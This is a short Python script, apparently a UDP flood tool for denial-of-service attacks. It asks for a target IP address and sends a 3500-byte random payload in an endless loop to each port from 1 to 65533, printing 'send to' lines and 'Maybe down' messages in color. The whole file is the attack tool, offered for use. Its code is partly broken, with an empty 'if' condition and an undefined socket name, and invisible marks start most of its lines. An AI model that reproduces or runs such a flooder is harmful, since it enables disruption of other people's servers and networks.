# -*- coding: utf-8 -*-
‎import os
‎import socket
‎import random
‎import time
‎import fade
‎
########################
‎white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
‎bytes = random._urandom(3500)
‎####################
‎
‎os.system("clear")
‎logo = """

‎"""
‎faded_text = fade.fire(logo)
‎print(faded_text)
‎ip = input("[+] Target's IP : ")
‎time.sleep(5),

‎while True:
‎    sent = 0
‎    for port in range(1, 65534):
‎        white.sendto(bytes, (ip, port))
‎        sent = sent + 1
‎        time.sleep(1)
‎        print("\033[94m[NAIwar] \033[97m%s  \033[31m[send to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
‎    if():
‎        s.close
‎        print("\033[31m.......Maybe down.......\033[0m")
‎
